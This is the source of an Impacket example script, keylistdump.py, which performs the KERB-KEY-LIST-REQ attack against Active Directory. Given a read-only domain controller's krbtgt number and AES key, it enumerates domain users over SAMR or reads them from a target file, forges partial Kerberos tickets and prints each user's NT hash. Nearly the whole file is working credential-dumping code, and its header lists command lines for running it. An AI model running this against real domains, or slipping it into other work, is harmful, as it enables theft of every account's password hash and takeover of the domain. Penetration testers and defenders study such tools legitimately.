#!/usr/bin/env python
# Impacket - Collection of Python classes for working with network protocols.
#
# SECUREAUTH LABS. Copyright (C) 2022 SecureAuth Corporation. All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   Performs the KERB-KEY-LIST-REQ attack to dump secrets
#   from the remote machine without executing any agent there
#
#   If the SMB credentials are supplied, the script starts by
#   enumerating the domain users via SAMR. Otherwise, the attack
#   is executed against the specified targets.
#
#   Examples:
#       ./keylistdump.py contoso.com/jdoe:pass@dc01 -rodcNo 20000 -rodcKey <aesKey>
#       ./keylistdump.py contoso.com/jdoe:pass@dc01 -rodcNo 20000 -rodcKey <aesKey> -full
#       ./keylistdump.py -kdc dc01.contoso.com -t victim -rodcNo 20000 -rodcKey <aesKey> LIST
#       ./keylistdump.py -kdc dc01 -domain contoso.com -tf targetfile.txt -rodcNo 20000 -rodcKey <aesKey> LIST
#
# Author:
#   Leandro Cuozzo (@0xdeaddood)
#

import logging
import os
import random

from impacket.examples import logger
from impacket.examples.secretsdump import RemoteOperations, KeyListSecrets
from impacket.examples.utils import parse_target
from impacket.krb5 import constants
from impacket.krb5.types import Principal
from impacket.smbconnection import SMBConnection
from impacket import version

try:
    rand = random.SystemRandom()
except NotImplementedError:
    rand = random
    pass


class KeyListDump:
    def __init__(self, remoteName, username, password, domain, options, enum, targets):
        self.__domain = domain
        self.__username = username
        self.__password = password
        self.__aesKey = options.aesKey
        self.__doKerberos = options.k
        self.__aesKeyRodc = options.rodcKey
        self.__remoteName = remoteName
        self.__remoteHost = options.target_ip
        self.__kdcHost = options.dc_ip
        self.__rodc = options.rodcNo
        # self.__kvno = 1
        self.__enum = enum
        self.__targets = targets
        self.__full = options.full
        self.__smbConnection = None
        self.__remoteOps = None
        self.__keyListSecrets = None

        if options.hashes is not None:
            self.__lmhash, self.__nthash = options.hashes.split(':')
        else:
            self.__lmhash = ''
            self.__nthash = ''

    def connect(self):
        try:
            self.__smbConnection = SMBConnection(self.__remoteName, self.__remoteHost)
            if self.__doKerberos:
                self.__smbConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash,
                                                   self.__nthash, self.__aesKey, self.__kdcHost)
            else:
                self.__smbConnection.login(self.__username, self.__password, self.__domain, self.__lmhash,
                                           self.__nthash)
        except Exception as e:
            if os.getenv('KRB5CCNAME') is not None and self.__doKerberos is True:
                # SMBConnection failed. That might be because there was no way to log into the
                # target system. We just have a last resort. Hope we have tickets cached and that they
                # will work
                logging.debug('SMBConnection didn\'t work, hoping Kerberos will help (%s)' % str(e))
                pass
            else:
                raise

    def run(self):
        if self.__enum is True:
            self.connect()
            self.__remoteOps = RemoteOperations(self.__smbConnection, self.__doKerberos, self.__kdcHost)
            self.__remoteOps.connectSamr(self.__domain)
            self.__keyListSecrets = KeyListSecrets(self.__domain, self.__remoteName, self.__rodc, self.__aesKeyRodc, self.__remoteOps)
            logging.info('Enumerating target users. This may take a while on large domains')
            if self.__full is True:
                targetList = self.getAllDomainUsers()
            else:
                targetList = self.__keyListSecrets.getAllowedUsersToReplicate()
        else:
            logging.info('Using target users provided by parameter')
            self.__keyListSecrets = KeyListSecrets(self.__domain, self.__remoteName, self.__rodc, self.__aesKeyRodc, None)
            targetList = self.__targets

        logging.info('Dumping Domain Credentials (domain\\uid:[rid]:nthash)')
        logging.info('Using the KERB-KEY-LIST request method. Tickets everywhere!')
        for targetUser in targetList:
            user = targetUser.split(":")[0]
            targetUserName = Principal('%s' % user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
            partialTGT, sessionKey = self.__keyListSecrets.createPartialTGT(targetUserName)
            fullTGT = self.__keyListSecrets.getFullTGT(targetUserName, partialTGT, sessionKey)
            if fullTGT is not None:
                key = self.__keyListSecrets.getKey(fullTGT, sessionKey)
                print(self.__domain + "\\" + targetUser + ":" + key[2:])

    def getAllDomainUsers(self):
        resp = self.__remoteOps.getDomainUsers()
        # Users not allowed to replicate passwords by default
        deniedUsers = [500, 501, 502, 503]
        targetList = []
        for user in resp['Buffer']['Buffer']:
            if user['RelativeId'] not in deniedUsers and "krbtgt_" not in user['Name']:
                targetList.append(user['Name'] + ":" + str(user['RelativeId']))

        return targetList


if __name__ == '__main__':
    import argparse
    import sys

    try:
        import pyasn1
        from pyasn1.type.univ import noValue, SequenceOf, Integer
    except ImportError:
        print('This module needs pyasn1 installed')
        sys.exit(1)

    print(version.BANNER)

    parser = argparse.ArgumentParser(add_help=True, description="Performs the KERB-KEY-LIST-REQ attack to dump "
                                                                "secrets from the remote machine without executing any agent there.")
    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<KDC HostName or IP address> (Use this credential '
                                                       'to authenticate to SMB and list domain users (low-privilege account) or LIST'
                                                       ' (if you want to parse a target file) ')
    parser.add_argument('-rodcNo', action='store', type=int, help='Number of the RODC krbtgt account')
    parser.add_argument('-rodcKey', action='store', help='AES key of the Read Only Domain Controller')
    parser.add_argument('-full', action='store_true', default=False, help='Run the attack against all domain users. '
                        'Noisy! It could lead to more TGS requests being rejected')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')

    group = parser.add_argument_group('LIST option')
    group.add_argument('-domain', action='store', help='The fully qualified domain name (only works with LIST)')
    group.add_argument('-kdc', action='store', help='KDC HostName or FQDN (only works with LIST)')
    group.add_argument('-t', action='store', help='Attack only the username specified (only works with LIST)')
    group.add_argument('-tf', action='store', help='File that contains a list of target usernames (only works with LIST)')

    group = parser.add_argument_group('authentication')
    group.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH", help='Use NTLM hashes to authenticate to SMB '
                                                                                'and list domain users.')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true", help='Use Kerberos to authenticate to SMB and list domain users. Grabs '
                       'credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot '
                       'be found, it will use the ones specified in the command line')
    group.add_argument('-aesKey', action="store", metavar="hex key", help='AES key to use for Kerberos Authentication'
                                                                          ' (128 or 256 bits)')
    group = parser.add_argument_group('connection')
    group.add_argument('-dc-ip', action='store', metavar="ip address", help='IP Address of the domain controller. If '
                       'ommited it use the domain part (FQDN) specified in the target parameter')
    group.add_argument('-target-ip', action='store', metavar="ip address",
                       help='IP Address of the target machine. If omitted it will use whatever was specified as target. '
                            'This is useful when target is the NetBIOS name and you cannot resolve it')

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    # Init the example's logger theme
    logger.init()

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)

    if options.rodcNo is None:
        logging.error("You must specify the RODC number (krbtgt_XXXXX)")
        sys.exit(1)
    if options.rodcKey is None:
        logging.error("You must specify the RODC aes key")
        sys.exit(1)

    domain, username, password, remoteName = parse_target(options.target)

    if remoteName == '':
        logging.error("You must specify a target or set the option LIST")
        sys.exit(1)

    if remoteName == 'LIST':
        targets = []
        if options.full is True:
            logging.warning("Flag -full will have no effect")
        if options.t is not None:
            targets.append(options.t)
        elif options.tf is not None:
            try:
                with open(options.tf, 'r') as f:
                    for line in f:
                        target = line.strip()
                        if target != '' and target[0] != '#':
                            targets.append(target + ":" + "N/A")
            except IOError as error:
                logging.error("Could not open file: %s - %s", options.tf, str(error))
                sys.exit(1)
            if len(targets) == 0:
                logging.error("No valid targets specified!")
                sys.exit(1)
        else:
            logging.error("You must specify a target username or targets file")
            sys.exit(1)

        if options.kdc is not None:
            if '.' in options.kdc:
                remoteName, domain = options.kdc.split('.', 1)
            else:
                remoteName = options.kdc
        else:
            logging.error("You must specify the KDC HostName or FQDN")
            sys.exit(1)

        if options.target_ip is None:
            options.target_ip = remoteName
        if options.domain is not None:
            domain = options.domain
        if domain == '':
            logging.error("You must specify a target domain. Use the flag -domain or define a FQDN in flag -kdc")
            sys.exit(1)

        keylistdumper = KeyListDump(remoteName, username, password, domain, options, False, targets)
    else:
        if '@' not in options.target:
            logging.error("You must specify the KDC HostName or IP Address")
            sys.exit(1)
        if options.target_ip is None:
            options.target_ip = remoteName
        if domain == '':
            logging.error("You must specify a target domain")
            sys.exit(1)
        if username == '':
            logging.error("You must specify a username")
            sys.exit(1)
        if password == '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
            from getpass import getpass
            password = getpass("Password:")

        keylistdumper = KeyListDump(remoteName, username, password, domain, options, True, targets=[])

    try:
        keylistdumper.run()
    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback

            traceback.print_exc()
        logging.error(e)